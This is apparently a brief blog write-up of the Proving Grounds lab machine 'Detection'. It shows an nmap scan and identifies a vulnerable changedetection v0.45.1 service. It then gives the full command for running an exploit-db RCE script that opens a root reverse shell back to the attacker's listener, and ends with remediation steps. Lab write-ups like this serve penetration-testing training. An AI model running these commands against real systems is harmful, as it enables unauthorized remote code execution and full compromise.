---
layout: writeup
title: Detection - Proving Grounds
date: 2024-08-07 13:32:20 +0300
description: A Writeup of the Detection Box from Proving Grounds
image: # /assets/images/Detection/Detection.png
fig-caption: # Add figcaption (optional)
tags: [Linux, changedetection]
---

Here's a new box from Proving Grounds. It's not on TJ Null's OSCP list or LainKusanagi's list, but it was new so I figured I'd try it out. As usual we get started with an nmap scan: `sudo nmap -p- -sC -A -v 192.168.197.97 --open -o nmap`. It reveals two open ports - 22 and 5000. Because 22 is often for admin of these labs, we can just check out 5000 in the URL of the browser, and we see this page:

![Detection1.png](/assets/images/Detection/Detection1.png){: .responsive-image}

We can see that the version we appear to be working with a web app called "changedetection" and it looks like version `v0.45.1` in the top right corner. I've never heard of this app, so I look to go check it out, and I also see that this is an RCE exploit availability for this `< 0.45.20` on exploit-db. We can see the required arguments below, taking note that the default port of the listener is 4444. 

![Detection2.png](/assets/images/Detection/Detection2.png){: .responsive-image}

After that we start a listener on port 4444 and run this full command (where 52027.py is the exploit found in searchsploit): `python3 52027.py --url http://192.168.197.97:5000/ --ip 192.168.45.239`.

![Detection3.png](/assets/images/Detection/Detection3.png){: .responsive-image}

And we get a shell, and it's root. Easy peasy. 

### Lessons Learned
Not a whole lot going on here. 

### Remediation Steps
1. Update to a different version of changedetection. 
2. Run it with something besides the root account, such as a service account. 